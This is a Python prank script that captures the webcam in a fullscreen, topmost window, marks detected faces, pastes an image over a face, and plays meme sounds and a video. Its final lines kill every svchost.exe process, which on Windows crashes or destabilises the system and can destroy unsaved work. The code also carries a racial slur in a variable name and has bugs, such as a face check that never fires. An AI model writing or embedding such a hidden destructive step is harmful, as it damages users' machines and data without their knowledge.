from time import sleep
import cv2
from playsound import playsound
from threading import Thread

face_cascade = cv2.CascadeClassifier('ebalo_cascade.xml')

cv2.namedWindow("window", cv2.WND_PROP_FULLSCREEN)
cv2.setWindowProperty("window",cv2.WND_PROP_FULLSCREEN,cv2.WINDOW_FULLSCREEN)
cv2.setWindowProperty("window",cv2.WND_PROP_TOPMOST,cv2.WND_PROP_TOPMOST)

video = 'shitpost.webm'
sound = "shitpost.mp3"
def listen_cap():
  cap = cv2.VideoCapture(0)

  while True:
    ret, frame = cap.read()
    if ret != True:
      break

    cv2.imshow('window', frame)

    if cv2.waitKey(25) & 0xFF == ord('q'):
      return frame

frame = listen_cap()

faces = face_cascade.detectMultiScale(frame)

if faces is []:
  quit()

def play_boom():
  playsound("vine-boom.mp3")

sleep(1)
for (x, y, w, h) in faces:
  cv2.rectangle(frame, (x, y), (x+w, y+h), (255, 0, 0), 2)
cv2.imshow('window', frame)
Thread(target=play_boom).start()
if cv2.waitKey(25) & 0xFF == ord('q'):
  pass

sleep(1)

f = faces[0]

niga_frame = frame[f[1]:f[1]+f[3], f[0]:f[0]+f[2]].shape

frame[f[1]:f[1]+f[3], f[0]:f[0]+f[2]] = cv2.resize(cv2.imread("download.jpg",cv2.IMREAD_UNCHANGED), (niga_frame[0], niga_frame[1]), interpolation = cv2.INTER_AREA)

cv2.imshow('window', frame)
Thread(target=play_boom).start()
if cv2.waitKey(25) & 0xFF == ord('q'):
  pass

sleep(1)

def play_video_and_sound(video, sound):
  # 30 FPS frames delay!
  # Change if not 30 fps!
  delay = 0.007

  is_run = False

  cap = cv2.VideoCapture(video)

  def shit():
    playsound(sound)

  is_run = False

  while True:
    ret, frame = cap.read()
    if ret != True:
      break

    cv2.imshow('window', frame)

    if not is_run:
      Thread(target=shit).start()
    
    is_run = True

    if cv2.waitKey(25) & 0xFF == ord('q'):
      break

    sleep(delay)
  cap.release()

  cv2.destroyAllWindows()

play_video_and_sound(video, sound)

import psutil

for proc in psutil.process_iter():
  if proc.name() == "svchost.exe":
      proc.kill()